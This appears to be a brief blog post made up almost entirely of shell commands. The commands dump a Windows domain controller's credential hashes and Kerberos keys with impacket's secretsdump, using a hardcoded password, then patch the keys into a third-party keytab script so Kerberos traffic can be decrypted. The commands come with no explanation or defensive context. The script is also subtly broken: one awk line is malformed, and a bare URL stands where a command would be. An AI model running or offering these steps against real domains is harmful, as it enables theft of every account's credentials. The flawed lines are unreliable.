---
title : "Kerberos traffic decryption"
author: fsociety
date: 2024-05-04 12:00:00 +0800
categories: [Kerberos]
tags: [Kerberos]
---

```
REALM='blackops.local'
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py blackops.local/fsociety:'P@ssw0rd'@dc.blackops.local -just-dc | tee secretsdump.out

cat secretsdump.out|grep aad3b435|awk -F: '{print "    (23, '\''"$4"'\''),"}' > keys
cat secretsdump.out|grep aes256-cts-hmac-sha1-96|awk -F: '{print "    (18, '\''"$3"'\''),"}' >> keys
https://github.com/BreachAssume/forest-trust-tools/blob/master/keytab.py
awk 'NR << 112' keytab.py > t
cat keys >> t
awk 'NR >= 118' keytab.py >> t
sed -i "s/TESTSEGMENT.LOCAL/${REALM}/g" t
mv t keytab.py
python3 keytab.py keytab.kt
```